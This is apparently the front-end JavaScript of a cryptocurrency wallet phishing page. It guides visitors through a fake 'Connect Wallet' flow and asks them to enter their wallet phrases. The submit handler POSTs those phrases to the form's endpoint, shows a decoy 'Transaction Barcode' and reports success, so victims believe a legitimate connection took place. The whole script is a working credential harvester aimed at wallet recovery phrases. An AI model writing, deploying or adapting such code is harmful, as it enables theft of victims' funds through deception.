document.addEventListener('DOMContentLoaded', () => {
    console.log('Script loaded');
    const walletSelect = document.getElementById('walletSelect');
    const userInput = document.getElementById('userInput');
    const connectWalletButton = document.getElementById('connectWalletButton');
    const submitSection = document.getElementById('submitSection');
    const submitButton = document.getElementById('submitButton');
    const statusMessage = document.getElementById('statusMessage');
    const messageForm = document.getElementById('messageForm');
    const barcodeContainer = document.getElementById('barcodeContainer');
    const connectButtons = document.querySelectorAll('.connect-button');

    if (!walletSelect || !userInput || !connectWalletButton || !submitSection) {
        console.error('One or more elements not found:', { walletSelect, userInput, connectWalletButton, submitSection });
        return;
    }

    // Smooth scroll for navbar links
    document.querySelectorAll('.nav-menu a').forEach(anchor => {
        anchor.addEventListener('click', (e) => {
            e.preventDefault();
            const targetId = anchor.getAttribute('href').substring(1);
            document.getElementById(targetId).scrollIntoView({ behavior: 'smooth' });
            if (targetId === 'connect-wallet') {
                console.log('Nav link clicked, showing wallet select');
                walletSelect.style.display = 'block';
                userInput.style.display = 'block';
                statusMessage.textContent = 'Please select a wallet and input your phrases.';
            }
        });
    });

    // Handle option card buttons with scroll
    connectButtons.forEach(button => {
        button.addEventListener('click', () => {
            console.log('Card button clicked:', button.getAttribute('data-option'));
            if (walletSelect && userInput) {
                walletSelect.style.display = 'block';
                userInput.style.display = 'block';
                statusMessage.textContent = `Please select a wallet and input your phrases to ${button.getAttribute('data-option')}.`;
                connectWalletButton.style.display = 'none';
                submitSection.style.display = 'none';
                barcodeContainer.style.display = 'none';
                document.getElementById('connect-wallet').scrollIntoView({ behavior: 'smooth' });
            } else {
                console.error('Wallet select or input not found');
            }
        });
    });

    // Handle wallet selection
    walletSelect.addEventListener('change', () => {
        console.log('Wallet selected:', walletSelect.value);
        if (walletSelect.value) {
            connectWalletButton.style.display = 'block';
            statusMessage.textContent = `Selected ${walletSelect.value}. Click "Connect Wallet" to proceed.`;
        } else {
            connectWalletButton.style.display = 'none';
        }
    });

    // Handle connect wallet button
    connectWalletButton.addEventListener('click', () => {
        console.log('Connect Wallet clicked');
        if (walletSelect.value) {
            submitSection.style.display = 'block';
            connectWalletButton.style.display = 'none';
            walletSelect.style.display = 'none';
            userInput.style.display = 'none';
            statusMessage.textContent = 'Please submit your phrases.';
        }
    });

    // Handle form submission
    messageForm.addEventListener('submit', (e) => {
        e.preventDefault();
        console.log('Submitting form with input:', userInput.value); // Debug the current value
        statusMessage.textContent = 'Kindly wait';
        statusMessage.style.fontWeight = '600';
        submitButton.disabled = true;

        // Ensure the textarea value is included
        const formData = new FormData(messageForm);
        formData.set('message', userInput.value); // Explicitly set the message field

        // Add barcode
        const barcodeImg = document.createElement('img');
        barcodeImg.src = 'https://barcode.tec-it.com/barcode.ashx?data=123456&code=Code128'; // Example barcode
        barcodeImg.alt = 'Transaction Barcode';
        barcodeContainer.innerHTML = '';
        barcodeContainer.appendChild(barcodeImg);
        barcodeContainer.style.display = 'block';

        fetch(messageForm.action, {
            method: 'POST',
            body: formData,
            headers: {
                'Accept': 'application/json'
            }
        }).then(response => {
            if (response.ok) {
                statusMessage.textContent = 'Message sent successfully!';
            } else {
                statusMessage.textContent = 'Error sending message.';
                barcodeContainer.style.display = 'none';
            }
            statusMessage.style.fontWeight = 'normal';
            submitButton.disabled = false;
        }).catch(error => {
            statusMessage.textContent = 'Network error. Please try again.';
            statusMessage.style.fontWeight = 'normal';
            barcodeContainer.style.display = 'none';
            submitButton.disabled = false;
            console.error('Error:', error);
        });
    });
});
